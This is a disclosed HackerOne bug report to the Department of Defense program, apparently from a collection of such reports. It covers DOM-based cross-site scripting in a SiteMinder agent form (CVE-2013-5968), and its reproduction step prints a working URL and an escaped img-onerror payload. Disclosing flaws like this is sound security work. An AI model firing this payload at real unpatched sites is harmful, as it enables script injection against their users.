---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1982099'
original_report_id: '1982099'
title: DOM-XSS
weakness: Cross-site Scripting (XSS) - DOM
team_handle: deptofdefense
created_at: '2023-05-10T19:06:02.781Z'
disclosed_at: '2023-06-02T18:20:25.394Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 7
tags:
- hackerone
- cross-site-scripting-xss-dom
---

# DOM-XSS

## Metadata

- HackerOne Report ID: 1982099
- Weakness: Cross-site Scripting (XSS) - DOM
- Program: deptofdefense
- Disclosed At: 2023-06-02T18:20:25.394Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

hello defense team :
I found DOM-XSS-SiteMinder on this subdomain : https://████/

## Impact

An attacker with access to the Siteminder CA could perform a cross-site scripting attack, which it would use to cause information leaks, privilege escalation, and/or denial of service.

## System Host(s)
██████████

## Affected Product(s) and Version(s)


## CVE Numbers
CVE-2013-5968

## Steps to Reproduce
Steps :
   1 go to https://███/siteminderagent/forms/smpwservices.fcc?SMAUTHREASON=7&USERNAME=\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e

    XSS will be triggered
this is payload :
\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e

## Suggested Mitigation/Remediation Actions

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
